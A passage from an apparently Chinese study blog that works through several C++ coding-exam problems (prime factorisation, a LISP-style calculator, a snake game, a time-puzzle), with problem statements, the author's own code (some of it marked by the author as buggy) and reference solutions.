<h2 id="个人代码-11"><a href="#个人代码-11" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">给定一个32位正整数，</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">请对其进行因数分解，找出是哪两个素数的乘积。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">如果成功找到，以单个空格分割，</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">从小到大输出两个素数，分解失败，请输出-1 -1。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">issushu</span><span class="params">(<span class="type">int</span> num)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(num);i++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(num%i==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"> <span class="type">int</span> num,tem=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> cin&gt;&gt;num;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(num&lt;=<span class="number">1</span>) </span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  cout&lt;&lt;<span class="string">&quot;-1 -1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">2</span>;i&lt;=<span class="built_in">sqrt</span>(num);i++)</span><br><span class="line"></span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">issushu</span>(i)&amp;&amp;num%i==<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">   tem=num/i;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">issushu</span>(tem))</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;tem;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">  cout&lt;&lt;<span class="string">&quot;-1 -1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="22-仿LISP运算"><a href="#22-仿LISP运算" class="headerlink" title="*22.仿LISP运算"></a>*22.仿LISP运算</h1><h2 id="题目描述-13"><a href="#题目描述-13" class="headerlink" title="题目描述"></a>题目描述</h2><p> LISP语言唯一的语法就是括号要配对。<br> 形如 (OP P1 P2 …)，括号内元素由单个空格分割。<br> 其中第一个元素OP为操作符，后续元素均为其参数，参数个数取决于操作符类型<br> 注意：参数 P1, P2 也有可能是另外一个嵌套的 (OP P1 P2 …)<br> 当前OP类型为add&#x2F;sub&#x2F;mul&#x2F;div(全小写)，分别代表整数的加减乘除法。简单起见，OP参数个数为2</p>
<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a><strong>举例</strong></h2><p>  输入：(mul 3 -7)输出：-21<br>  输入：(add 1 2) 输出：3<br>  输入：(sub (mul 2 4) (div 9 3)) 输出 ：5<br>  输入：(div 1 0) 输出：error<br><strong>输入描述</strong>：<br>  合法C字符串，字符串长度不超过512，用例保证了无语法错误<br><strong>输出描述</strong>：<br>  合法C字符串，字符包括’0’-‘9’及负号’-‘或者’error’</p>
<h2 id="个人代码（有误，暂略）"><a href="#个人代码（有误，暂略）" class="headerlink" title="个人代码（有误，暂略）"></a>个人代码（有误，暂略）</h2><p>双栈思想：操作码栈，参数栈。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stack&lt;string&gt; op;</span><br><span class="line">stack&lt;int&gt; num;</span><br><span class="line">void jisuan(stack&lt;string&gt; &amp;op,stack&lt;int&gt; &amp;nums,int n1,int n2)</span><br><span class="line">&#123;</span><br><span class="line">    string s=op.top();</span><br><span class="line">   // cout&lt;&lt;s&lt;&lt;endl;</span><br><span class="line">    op.pop();//弹出</span><br><span class="line">    switch(s[0])&#123; //说是只支持int或char</span><br><span class="line">         case &#x27;a&#x27;:</span><br><span class="line">               // return n1+n2;</span><br><span class="line">               nums.push(n1+n2);</span><br><span class="line">                break;</span><br><span class="line">        case &#x27;m&#x27;:</span><br><span class="line">               // return n1*n2;</span><br><span class="line">                 nums.push(n1*n2);</span><br><span class="line">                break;</span><br><span class="line">        case &#x27;s&#x27;:</span><br><span class="line">               // return n1-n2;</span><br><span class="line">               nums.push(n1-n2);</span><br><span class="line">                break;</span><br><span class="line">        case &#x27;d&#x27;:</span><br><span class="line">               // return n1/n2;</span><br><span class="line">               if(n2==0) cout&lt;&lt;&quot;error&quot;;</span><br><span class="line">               else nums.push(n1/n2);</span><br><span class="line">                break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void solution(string s)</span><br><span class="line">&#123;</span><br><span class="line">    int index=0;//操作数下标</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        //(sub (mul 256 45) (div 91 30))</span><br><span class="line">        if(s[i]==&#x27;(&#x27;) //截取操作符</span><br><span class="line">        &#123;</span><br><span class="line">            op.push(s.substr(i+1,3));//</span><br><span class="line">           // cout&lt;&lt;s.substr(i+1,3)&lt;&lt;endl;</span><br><span class="line">             i=i+4;//符号位后第一个参数前的空格</span><br><span class="line">             index=i+1;//符号位后第一个参数的起始位置。可能是负数，可能是两位以上</span><br><span class="line">        &#125;</span><br><span class="line">        else if(s[i]==&#x27; &#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">           // index=i+1;//</span><br><span class="line">           if(index&lt;i)</span><br><span class="line">           &#123;</span><br><span class="line">                num.push(stoi(s.substr(index,i-index)));//起始位置与个数</span><br><span class="line">                //cout&lt;&lt;num.top();</span><br><span class="line">                 i++;</span><br><span class="line">                index=i+1;//第二个参数的起始位置</span><br><span class="line">           &#125;</span><br><span class="line">          </span><br><span class="line">         //  num.push_back(stoi(s[index]));//哦，如果是两位数，就不能这样写</span><br><span class="line">        &#125;</span><br><span class="line">        else if(s[i]==&#x27;)&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            if(index&lt;i) </span><br><span class="line">            &#123;</span><br><span class="line">                num.push(stoi(s.substr(index, i - index)));</span><br><span class="line">                i++;</span><br><span class="line">                index = i + 1; // 参数起始位置</span><br><span class="line">            &#125;</span><br><span class="line">            //括号闭合一次，就算一次</span><br><span class="line">            int n2=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            int n1=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            jisuan(op,num,n1,n2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    while(!op.empty())//操作符栈非空</span><br><span class="line">    &#123;</span><br><span class="line">            int n2=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            int n1=num.top();</span><br><span class="line">            num.pop();</span><br><span class="line">            jisuan(op,num,n1,n2);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;num.top();</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    //vector&lt;char&gt; kuohao;</span><br><span class="line">    solution(s);</span><br><span class="line">   // cout&lt;&lt;num.top();</span><br><span class="line">   while(!op.empty())</span><br><span class="line">   &#123;</span><br><span class="line">    cout&lt;&lt;op.top()&lt;&lt;endl;</span><br><span class="line">    op.pop();</span><br><span class="line">   &#125;</span><br><span class="line">    while(!num.empty())</span><br><span class="line">   &#123;</span><br><span class="line">    cout&lt;&lt;num.top()&lt;&lt;endl;</span><br><span class="line">    num.pop();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>栈里的数值没有写进去？</p>
<h2 id="参考代码"><a href="#参考代码" class="headerlink" title="参考代码"></a>参考代码</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stack&lt;<span class="type">int</span>&gt; num_stack;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 操作符栈</span></span><br><span class="line">stack&lt;string&gt; opera_stack;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">calc</span><span class="params">(<span class="type">int</span> param_1, <span class="type">int</span> param_2)</span> </span>&#123;</span><br><span class="line">    string op = opera_stack.<span class="built_in">top</span>();</span><br><span class="line">    opera_stack.<span class="built_in">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="string">&quot;add&quot;</span>) &#123;</span><br><span class="line">        num_stack.<span class="built_in">push</span>(param_1 + param_2);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;sub&quot;</span>) &#123;</span><br><span class="line">        num_stack.<span class="built_in">push</span>(param_1 - param_2);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&quot;mul&quot;</span>) &#123;</span><br><span class="line">        num_stack.<span class="built_in">push</span>(param_1 * param_2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (param_2 == <span class="number">0</span>) &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;error&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> res = param_1 / param_2;</span><br><span class="line">            <span class="keyword">if</span> (param_1 % param_2 != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    res -= <span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            num_stack.<span class="built_in">push</span>(res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">solution_01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 处理输入</span></span><br><span class="line">    string exp;</span><br><span class="line">    <span class="built_in">getline</span>(cin, exp);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mark = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> param_1 = <span class="number">0</span>; <span class="comment">// 参数1</span></span><br><span class="line">    <span class="type">int</span> param_2 = <span class="number">0</span>; <span class="comment">// 参数2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; exp.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">        string ch = exp.<span class="built_in">substr</span>(i, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&quot;(&quot;</span>) &#123;</span><br><span class="line">            opera_stack.<span class="built_in">push</span>(exp.<span class="built_in">substr</span>(i + <span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">            i += <span class="number">4</span>;</span><br><span class="line">            mark = i + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&quot;)&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mark &lt; i) &#123;</span><br><span class="line">                num_stack.<span class="built_in">push</span>(<span class="built_in">stoi</span>(exp.<span class="built_in">substr</span>(mark, i - mark)));</span><br><span class="line">                i += <span class="number">1</span>;</span><br><span class="line">                mark = i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            param_2 = num_stack.<span class="built_in">top</span>();</span><br><span class="line">            num_stack.<span class="built_in">pop</span>();</span><br><span class="line">            param_1 = num_stack.<span class="built_in">top</span>();</span><br><span class="line">            num_stack.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="built_in">calc</span>(param_1, param_2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">&quot; &quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (mark &lt; i) &#123;</span><br><span class="line">                    num_stack.<span class="built_in">push</span>(<span class="built_in">stoi</span>(exp.<span class="built_in">substr</span>(mark, i - mark)));</span><br><span class="line">                    mark = i + <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!opera_stack.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">        param_2 = num_stack.<span class="built_in">top</span>();</span><br><span class="line">        num_stack.<span class="built_in">pop</span>();</span><br><span class="line">        param_1 = num_stack.<span class="built_in">top</span>();</span><br><span class="line">        num_stack.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="built_in">calc</span>(param_1, param_2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> num_stack.<span class="built_in">top</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> ans = <span class="built_in">solution_01</span>();</span><br><span class="line">    cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="23-贪吃蛇"><a href="#23-贪吃蛇" class="headerlink" title="*23.贪吃蛇"></a>*23.贪吃蛇</h1><h2 id="题目描述-14"><a href="#题目描述-14" class="headerlink" title="题目描述"></a>题目描述</h2><p>贪吃蛇是一个经典游戏，蛇的身体由若干方格连接而成，身体随蛇头移动。蛇头触碰到食物时，蛇的长度会增加一格。蛇头和身体的任一方格或者游戏版图边界碰撞时，游戏结束。</p>
<p>下面让我们来完成贪吃蛇游戏的模拟：<br>给定一个N<em>M的数组ar，代表N</em>M个方格组成的版图，贪吃蛇每次移动一个方格。若ar[i][j]=&#x3D;’H’，表示该方可为贪吃蛇的起始位置;若ar[i][j]=&#x3D;’F’，表示该方格为食物，若ar[i][j]&#x3D;&#x3D;’E’，表示该方格为空格。<br>贪吃蛇初始长度为1，初始移动方向为向左。输入为给定一系列贪吃蛇的移动操作，返回操作后蛇的长度，如果在操作执行完之前已经游戏结束，返回游戏结束时贪吃蛇的长度。<br>贪吃蛇移动、吃食物和碰撞处理的细节见下面图示:</p>
<p><img src="/../../../Typora/img111/image-20230717184145792.png"></p>
<p>图 1:截取了贪吃蛇移动的一个中间状态，H表示蛇头，F表示食物，数字为蛇身体各节的 编号，蛇为向左移动，此时蛇头和食物已经相邻。</p>
<p>图 2:蛇头向左移动一格，蛇头和食物重叠，注意此时食物的格子成为了新的蛇头，第 1节 身体移动到蛇头位置，第 2节身体移动到第 1节身体位置，以此类推，最后添加第 4节升 起到原来第 3节身体的位置。</p>
<p>图 3:蛇头继续向左移动一格，身体的各节按上述规则移动，此时蛇头已经和边界相邻，但 还未碰撞。</p>
<p>图 4:蛇头继续向左移动一格，此时蛇头<strong>已经超过边界</strong>，发生碰撞，游戏结束。</p>
<p>图 5和图 6给出一个<strong>蛇头和身体碰撞</strong>的例子，蛇为向上移动。图 5时蛇头和第 7节身体相 邻，但还未碰撞;图 6蛇头向上移动一格，此时蛇头和第 8节身体都移动到了原来第 7节 身体的位置，发生碰撞，游戏结束。</p>
<h2 id="输入描述-18"><a href="#输入描述-18" class="headerlink" title="输入描述:"></a>输入描述:</h2><p>输入第 1行为空格分隔的字母，代表贪吃蛇的移动操作。字母取值为 U、D、L、R、G，其中U、D、L、R分别表示贪吃蛇往上、下、左、右转向，<strong>转向时贪吃蛇不移动</strong>，G表示<strong>贪吃蛇按当前的方向移动一格</strong>。用例保证输入的操作正确。</p>
<p>第 2行为空格分隔的两个数，指定为 N和 M，<strong>为数组的行和列数</strong>。余下 N行每行是空格分 隔的 M个字母。字母取值为 H、F和 E，<strong>H表示贪吃蛇的起始位置</strong>，<strong>F表示食物</strong>，<strong>E表示该 方格为空</strong>。用例保证有且<strong>只有一个 H，而 F和 E会有多个</strong>。</p>
<h2 id="输出描述-18"><a href="#输出描述-18" class="headerlink" title="输出描述:"></a>输出描述:</h2><p>输出一个数字为蛇的长度。<br>示 例:<br>输入<br>D G G<br>3 3<br>F F F<br>F F H<br>E F E<br>输出<br>1</p>
<p>说明：向下移动两格，第一步吃空，第二步越界，故长度为1。</p>
<h2 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h2><p>主要思路为：</p>
<blockquote>
<p>更新路线：</p>
<p>​		1.当遇到E时，即空格，删除尾巴，添加新头部 (维持长度不变)</p>
<p>​		2.当遇到F时，添加头部	(添加长度)</p>
<p>​		3.始终用头部进行“移动”判断E和F</p>
<p>返回所记录的有效坐标的个数，即为长度</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int tanchishe(vector&lt;char&gt; s, vector&lt;vector&lt;char&gt;&gt; a, int n, int m)</span><br><span class="line">&#123;</span><br><span class="line">    // 找到起始位置</span><br><span class="line">    int x = 0, y = 0;</span><br><span class="line">    for (int i = 0; i &lt; n; i++)</span><br><span class="line">        for (int j = 0; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            if (a[i][j] == &#x27;H&#x27;)</span><br><span class="line">            &#123;</span><br><span class="line">                a[i][j] = &#x27;E&#x27;; // 头移动变空格</span><br><span class="line">                x = i;</span><br><span class="line">                y = j;</span><br><span class="line"></span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    pair&lt;int, int&gt; head = make_pair(x, y); // 头部</span><br><span class="line">    cout &lt;&lt; &quot;头部坐标:&quot; &lt;&lt; head.first &lt;&lt; &quot;,&quot; &lt;&lt; head.second &lt;&lt; endl;</span><br><span class="line">    //  vector&lt;pair&lt;int,int&gt; &gt; body&#123;head&#125;;//初始化</span><br><span class="line"></span><br><span class="line">    deque&lt;pair&lt;int, int&gt;&gt; body = &#123;head&#125;; // 为了头部插入</span><br><span class="line">    char direction = &#x27;L&#x27;;</span><br><span class="line">    for (auto dir : s)</span><br><span class="line">    &#123;</span><br><span class="line">        // pair&lt;int,int&gt; next; //1.不该在这个位置，第一次选择方向而不是G时，默认为0,0</span><br><span class="line">        if (dir == &#x27;U&#x27;)</span><br><span class="line">            direction = &#x27;U&#x27;;</span><br><span class="line">        if (dir == &#x27;D&#x27;)</span><br><span class="line">            direction = &#x27;D&#x27;;</span><br><span class="line">        if (dir == &#x27;L&#x27;)</span><br><span class="line">            direction = &#x27;L&#x27;;</span><br><span class="line">        if (dir == &#x27;R&#x27;)</span><br><span class="line">            direction = &#x27;R&#x27;;</span><br><span class="line">        if (dir == &#x27;G&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            pair&lt;int, int&gt; next;</span><br><span class="line">            switch (direction)</span><br><span class="line">            &#123;</span><br><span class="line">            case &#x27;U&#x27;: // 上移</span><br><span class="line">                // x--;</span><br><span class="line">                next = make_pair(body[0].first - 1, body[0].second);</span><br><span class="line">                break;</span><br><span class="line">            case &#x27;D&#x27;:</span><br><span class="line">                // x++;</span><br><span class="line">                next = make_pair(body[0].first + 1, body[0].second);</span><br><span class="line">                cout &lt;&lt; endl</span><br><span class="line">                     &lt;&lt; next.first &lt;&lt; &quot;,&quot; &lt;&lt; next.second &lt;&lt; endl;</span><br><span class="line">                cout &lt;&lt; endl</span><br><span class="line">                     &lt;&lt; body.front().first &lt;&lt; &quot;,&quot; &lt;&lt; body.front().second &lt;&lt; endl;</span><br><span class="line">                break;</span><br><span class="line">            case &#x27;L&#x27;:</span><br><span class="line">                // y--;</span><br><span class="line">                next = make_pair(body[0].first, body[0].second - 1);</span><br><span class="line">                break;</span><br><span class="line">            case &#x27;R&#x27;:</span><br><span class="line">                // y++;</span><br><span class="line">                next = make_pair(body[0].first, body[0].second + 1);</span><br><span class="line">                break;</span><br><span class="line"></span><br><span class="line">                if (x &lt; 0 || y &lt; 0 || x &gt; n - 1 || y &gt; m - 1)</span><br><span class="line">                    return body.size();</span><br><span class="line"></span><br><span class="line">                cout &lt;&lt; endl;</span><br><span class="line">                // 尾巴碰撞检查</span><br><span class="line">                for (auto c : body)</span><br><span class="line">                &#123;</span><br><span class="line">                    if (c == next)</span><br><span class="line">                        return body.size();</span><br><span class="line">                &#125;</span><br><span class="line">                //  if(found) return body.size();</span><br><span class="line">                //   if(x==a[0]&amp;&amp;y==a[1]) return body.size();</span><br><span class="line">                // if()</span><br><span class="line">                if (a[next.first][next.second] == &#x27;E&#x27;) // 空格</span><br><span class="line">                &#123;</span><br><span class="line">                    // 更新身体，添加头部，去掉尾部</span><br><span class="line">                    // body.push_back(&#123;x,y&#125;);</span><br><span class="line">                    cout &lt;&lt; &quot;删除尾巴，添加头部:&quot; &lt;&lt; next.first &lt;&lt; &quot;,&quot; &lt;&lt; next.second &lt;&lt; endl;</span><br><span class="line">                    body.pop_back();</span><br><span class="line">                    body.push_front(next);</span><br><span class="line">                    // body.insert(next,body.begin(),body.end());错误用法</span><br><span class="line">                &#125;</span><br><span class="line">                else if (a[next.first][next.second] == &#x27;F&#x27;) // 吃了东西</span><br><span class="line">                &#123;</span><br><span class="line">                    // 1.有个问题</span><br><span class="line">                    // 一开始的时候，没有执行G，deque里没有值，默认为0,0，相当于判定了0,0</span><br><span class="line">                    // 如果真的是F</span><br><span class="line">                    cout &lt;&lt; &quot;吃了东西&quot; &lt;&lt; next.first &lt;&lt; &quot;,&quot; &lt;&lt; next.second &lt;&lt; endl;</span><br><span class="line">                    body.push_front(next);</span><br><span class="line">                    a[next.first][next.second] = &#x27;E&#x27;;</span><br><span class="line">                &#125;</span><br><span class="line">                cout &lt;&lt; &quot;body:&quot; &lt;&lt; endl;</span><br><span class="line">                for (auto c : body)</span><br><span class="line">                    cout &lt;&lt; &quot;(&quot; &lt;&lt; c.first &lt;&lt; &quot;,&quot; &lt;&lt; c.second &lt;&lt; &quot;) &quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return body.size();</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    vector&lt;char&gt; s;</span><br><span class="line">    char sw;</span><br><span class="line">    while (cin &gt;&gt; sw)</span><br><span class="line">    &#123;</span><br><span class="line">        s.push_back(sw);</span><br><span class="line">        if (cin.get() == &#x27;\n&#x27;)</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    int n, m;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    vector&lt;vector&lt;char&gt;&gt; a(n, vector&lt;char&gt;(m)); // a[n][m];</span><br><span class="line">    for (int i = 0; i &lt; n; i++)</span><br><span class="line">        for (int j = 0; j &lt; m; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; a[i][j];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; tanchishe(s, a, n, m);</span><br><span class="line">    //    pair&lt;int,int&gt; de=make_pair(1,3);</span><br><span class="line">    //    deque&lt;pair&lt;int,int&gt; &gt;s=&#123;de&#125;;</span><br><span class="line">    //    cout&lt;&lt;s[0].first+1&lt;&lt;&quot; &quot;&lt;&lt;s[0].second;</span><br><span class="line">    // for(int i=0;i&lt;n;i++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     for(int j=0;j&lt;m;j++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;a[i][j]&lt;&lt;&quot; &quot;;</span><br><span class="line">    // &#125;</span><br><span class="line">    // cout&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="24-解密犯罪时间"><a href="#24-解密犯罪时间" class="headerlink" title="*24.解密犯罪时间"></a>*24.解密犯罪时间</h1><p>警察在侦破一个案件时，得到了线人给出的可能犯罪时间，形如 “HH:MM” 表示的时刻。<br>根据警察和线人的约定，为了隐蔽，该时间是修改过的，解密规则为：利用当前出现过的数字，构造下一个<strong>距离当前时间最近的时刻</strong>，则该时间为可能的犯罪时间<strong>。每个出现数字都可以被无限次使用</strong>。</p>
<h2 id="输入描述-19"><a href="#输入描述-19" class="headerlink" title="输入描述:"></a>输入描述:</h2><p>形如HH:SS的字符串，表示原始输入</p>
<h2 id="输出描述-19"><a href="#输出描述-19" class="headerlink" title="输出描述:"></a>输出描述:</h2><p>形如HH:SS的字符串，表示推理出来的犯罪时间</p>
<h2 id="示例1-2"><a href="#示例1-2" class="headerlink" title="示例1"></a>示例1</h2><p>输入</p>
<blockquote>
<p>18:52</p>
</blockquote>
<p>输出</p>
<blockquote>
<p>18:55</p>
</blockquote>
<p>说明</p>
<blockquote>
<p>利用数字1, 8, 5, 2构造出来的最近时刻是18:55，是3分钟之后。结果不是18:51因为这个时刻是18小时52分钟之后。</p>
</blockquote>
<h2 id="示例2-1"><a href="#示例2-1" class="headerlink" title="示例2"></a>示例2</h2><p>输入</p>
<blockquote>
<p>23:59</p>
</blockquote>
<p>输出</p>
<blockquote>
<p>22:22</p>
</blockquote>
<p>说明</p>
<blockquote>
<p>利用数字2, 3, 5, 9构造出来的最近时刻是22:22。 答案一定是第二天的某一时刻，所以选择可构造的最小时刻为犯罪时间。</p>
</blockquote>
<p>备注:</p>
<p>可以保证线人给定的字符串一定是合法的。例如，“01:35” 和 “11:08” 是合法的，“1:35” 和 “11:8” 是不合法的。<br>最近的时刻有可能在第二天</p>
<p><strong>目的</strong></p>
<blockquote>
<p>也就是说是，拆分组合后的，最大又最接近的时间。</p>
<p>线人肯定是给的提前的时间，所以要预估接下来的时间</p>
</blockquote>
<p>23:59，拆成[2,3,5,9]，任意组合，第二天最大又最接近的时间为22:22，23:55呢？</p>
<h2 id="个人代码-有误"><a href="#个人代码-有误" class="headerlink" title="个人代码(有误)"></a>个人代码(有误)</h2><pre><code>/*思路（错误思路，不符合用例）
正常情况下：组合遍历，结果为大于原时间中，最小的那个时间
特殊情况下：第二天的时间，小于又最接近原时间的时间
*/
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    string s;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    map&lt;char,int&gt; mp;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]!=&#x27;:&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            if(!mp.count(s[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                mp[s[i]]=s[i]-&#x27;0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //1124</span><br><span class="line">    map&lt;string,string&gt; hh,mm;</span><br><span class="line">    // map&lt;char,int&gt; mp;</span><br><span class="line">    // mp[&#x27;1&#x27;]=&#x27;1&#x27;-&#x27;0&#x27;;</span><br><span class="line">    // mp[&#x27;2&#x27;]=&#x27;2&#x27;-&#x27;0&#x27;;</span><br><span class="line">    // mp[&#x27;3&#x27;]=&#x27;3&#x27;-&#x27;0&#x27;;</span><br><span class="line">   </span><br><span class="line">   // 构造可能的HH</span><br><span class="line">    for(pair&lt;char,int&gt;list1:mp)</span><br><span class="line">    for(pair&lt;char,int&gt;list2:mp)</span><br><span class="line">    &#123;</span><br><span class="line">        string 